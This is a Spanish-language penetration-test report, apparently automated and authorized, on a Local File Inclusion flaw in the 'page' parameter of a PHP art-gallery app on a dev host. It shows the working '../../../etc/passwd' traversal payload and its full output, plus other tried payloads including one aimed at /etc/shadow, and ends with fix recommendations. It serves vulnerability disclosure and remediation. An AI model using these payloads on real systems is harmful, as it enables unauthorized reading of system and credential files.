# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:21:22  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Estado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## Resumen Ejecutivo

Se identificó una vulnerabilidad crítica de **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo archivos de configuración sensibles y datos del sistema.

---

## Descripción de la Aplicación

La aplicación es una galería de arte virtual que utiliza PHP. Su página principal (`index.php`) expone enlaces a `gallery.php` con un parámetro `page` que acepta valores como `modern`, `classic`, `abstract` y `about`.

---

## Vulnerabilidad Detectada

### LFI en `gallery.php` - Parámetro `page`

| Campo | Detalle |
|-------|---------|
| **URL vulnerable** | `http://web.dev.local:8081/gallery.php?page=` |
| **Parámetro** | `page` |
| **Tipo** | Local File Inclusion (LFI) |
| **Severidad** | Crítica |
| **CVE relacionado** | CWE-98 (Improper Control of Filename for Include/Require Statement) |

**Descripción:** El parámetro `page` es utilizado directamente en una función de inclusión de ficheros PHP (como `include()` o `require()`) sin sanitización adecuada. Esto permite la inyección de rutas arbitrarias mediante técnicas de path traversal (`../`).

---

## Explotación

### Payload utilizado

```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

### Resultado obtenido

El servidor devolvió el contenido completo del archivo `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Otros payloads probados

| Payload | Resultado |
|---------|-----------|
| `../../../etc/passwd` | ✅ Exitoso - Contenido del archivo devuelto |
| `/etc/passwd` (ruta absoluta) | ❌ No devolvió contenido de /etc/passwd |
| `....//....//....//etc/passwd` | ❌ No devolvió contenido |
| `../../../etc/shadow` | ❌ Sin permisos (acceso denegado) |

---

## Impacto

- **Lectura de archivos del sistema:** Un atacante puede leer cualquier archivo accesible por el proceso del servidor web (usuario `www-data`).
- **Exposición de información sensible:** Archivos de configuración, claves de aplicación, archivos de log, código fuente PHP.
- **Escalada potencial:** En combinación con otras vulnerabilidades (ej. log poisoning), podría derivar en Remote Code Execution (RCE).

---

## Recomendaciones

1. **Validación de entrada estricta:** Usar una lista blanca (whitelist) de páginas permitidas y nunca usar el input del usuario directamente en funciones de inclusión.
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed)) {
       die('Página no válida');
   }
   include('pages/' . $_GET['page'] . '.php');
   ```

2. **Eliminar la posibilidad de path traversal:** Usar `basename()` o `realpath()` para normalizar la ruta y verificar que pertenece al directorio esperado.

3. **Deshabilitar `allow_url_include`** en `php.ini` (aunque no afecta a LFI local).

4. **Aplicar el principio de mínimo privilegio:** El servidor web no debe tener acceso de lectura a archivos fuera de su directorio de trabajo.

5. **Implementar WAF:** Un Web Application Firewall puede detectar y bloquear payloads de path traversal.

---

## Conclusión

La aplicación web presenta una vulnerabilidad crítica de LFI en el parámetro `page` de `gallery.php`. La explotación fue exitosa, permitiendo la lectura del archivo `/etc/passwd` del servidor. Se recomienda aplicar las correcciones descritas de forma inmediata.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
